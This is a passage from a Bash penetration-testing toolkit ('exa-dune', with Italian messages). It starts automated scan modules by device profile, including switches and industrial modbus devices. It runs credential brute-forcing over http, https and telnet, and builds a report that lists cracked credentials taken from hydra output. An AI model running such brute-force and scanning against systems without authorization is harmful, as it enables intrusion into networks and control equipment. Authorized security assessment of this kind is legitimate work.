                 -oA $OUTDIR_BASE/scan/pjl 2>&1; echo '[DONE] pjl'"
            ;;
        switch)
            _auto_mod "web_80"  web    "$target" --port 80  --scheme http
            _auto_mod "web_443" web    "$target" --port 443 --scheme https
            _auto_mod "ssh"     ssh    "$target"
            _auto_mod "telnet"  telnet "$target"
            _auto_mod "snmp"    snmp   "$target"
            _auto_mod "creds_http"   creds "$target" http
            _auto_mod "creds_https"  creds "$target" https
            _auto_mod "creds_telnet" creds "$target" telnet
            ;;
        ics)
            _auto_mod "modbus" modbus "$target"
            _auto_mod "snmp"   snmp   "$target"
            _auto_mod "web_80" web    "$target" --port 80 --scheme http
            ;;
        generic|*)
            _auto_mod "web_80"   web    "$target" --port 80  --scheme http
            _auto_mod "web_443"  web    "$target" --port 443 --scheme https
            _auto_mod "sip"      sip    "$target"
            _auto_mod "smb"      smb    "$target"
            _auto_mod "snmp"     snmp   "$target"
            _auto_mod "ftp"      ftp    "$target"
            _auto_mod "ssh"      ssh    "$target"
            _auto_mod "telnet"   telnet "$target"
            _auto_mod "mqtt"     mqtt   "$target"
            _auto_mod "upnp"     upnp   "$target"
            _auto_mod "modbus"   modbus "$target"
            _auto_mod "ssl_443"  ssl    "$target"
            _auto_mod "dns"      dns    "$target"
            _auto_mod "fw"       fw     "$target"
            _auto_mod "creds_http"  creds "$target" http
            _auto_mod "creds_https" creds "$target" https
            ;;
    esac

    echo ""
    if [[ $DRY_RUN -eq 0 ]]; then
        ok "Tutti i moduli avviati in sessione tmux: $session"
        echo -e "  Connettiti: ${BOLD}tmux attach -t $session${NC}"
        echo -e "  Output:     ${BOLD}$OUTDIR_BASE/${NC}"
        echo -e "  Report:     ${BOLD}exa-dune report $OUTDIR_BASE${NC}"
        if command -v notify-send &>/dev/null; then
            notify-send "PentestKit" "Auto-assessment avviato: $target ($profile)" 2>/dev/null || true
        fi
    fi
}

# ============================================================
#  SUBCOMMAND: report
# ============================================================
usage_report() {
    echo "Uso: exa-dune report <OUTDIR> [OPTIONS]"
    echo ""
    echo "  Genera report da risultati in OUTDIR"
    echo ""
    echo "Opzioni:"
    echo "  --html             Genera report HTML con severity colorata"
    echo "  --pdf              Genera report PDF (richiede wkhtmltopdf o chromium)"
    echo "  --dry-run"
}

cmd_report() {
    local outdir="" do_html=0 do_pdf=0
    while [[ $# -gt 0 ]]; do
        case "$1" in
            --html)    do_html=1;  shift ;;
            --pdf)     do_pdf=1; do_html=1; shift ;;
            --dry-run) DRY_RUN=1; shift ;;
            --help|-h) usage_report; exit 0 ;;
            -*)        err "Opzione sconosciuta: $1"; usage_report; exit 1 ;;
            *)         outdir="$1"; shift ;;
        esac
    done
    [[ -z "$outdir" ]] && { err "Directory non specificata"; usage_report; exit 1; }
    [[ ! -d "$outdir" && $DRY_RUN -eq 0 ]] && { err "Directory non trovata: $outdir"; usage_report; exit 1; }
    outdir="${outdir%/}"

    local report_file="$outdir/REPORT_$(date +%Y%m%d_%H%M%S).txt"
    # Extract IP or hostname from directory name (e.g. exa-dune-10-0-0-1-20250101)
    local target; target=$(basename "$outdir" | grep -oP '(\d{1,3}-){3}\d{1,3}' | head -1 | tr '-' '.' 2>/dev/null || true)
    [[ -z "$target" ]] && target=$(basename "$outdir")

    # Helper: print section header
    _section() { printf '\n── %-47s\n' "$1" | tr ' ' '─' | head -c 51; echo; }

    {
        echo "═══════════════════════════════════════════════════"
        echo "  EXA-DUNE — Report di Assessment"
        echo "  Target : $target"
        echo "  Outdir : $outdir"
        echo "  Data   : $(date)"
        echo "═══════════════════════════════════════════════════"

        # ── FINDINGS aggregati da tutti i sottomoduli ────────
        _section "FINDINGS"
        local has_findings=0
        # Findings in root (da run singolo) e in ogni subdir (da auto)
        while IFS= read -r -d '' ffile; do
            local module; module=$(basename "$(dirname "$ffile")")
            [[ "$module" == "$(basename "$outdir")" ]] && module="root"
            while IFS= read -r line; do
                [[ -z "$line" ]] && continue
                printf "  [%-10s] %s\n" "$module" "$line"
                has_findings=1
            done < "$ffile"
        done < <(find "$outdir" -name "findings.txt" -print0 2>/dev/null | sort -z)
        [[ $has_findings -eq 0 ]] && echo "  (nessun finding registrato)"

        # ── CREDENZIALI ──────────────────────────────────────
        _section "CREDENZIALI"
        local has_creds=0
        # Da hydra output
        while IFS= read -r -d '' hfile; do
            local module; module=$(basename "$(dirname "$hfile")")
            [[ "$module" == "$(basename "$outdir")" ]] && module="root"
            while IFS= read -r line; do
                [[ "$line" == *"login:"* ]] || continue
                printf "  [%-10s] %s\n" "$module" "$line"
                has_creds=1
            done < "$hfile"
        done < <(find "$outdir" -name "hydra_*.txt" -print0 2>/dev/null | sort -z)
        [[ $has_creds -eq 0 ]] && echo "  (nessuna credenziale trovata)"

        # ── PORTE APERTE ─────────────────────────────────────
        _section "PORTE APERTE"
        local nmap_file
        nmap_file=$(find "$outdir" -maxdepth 2 \
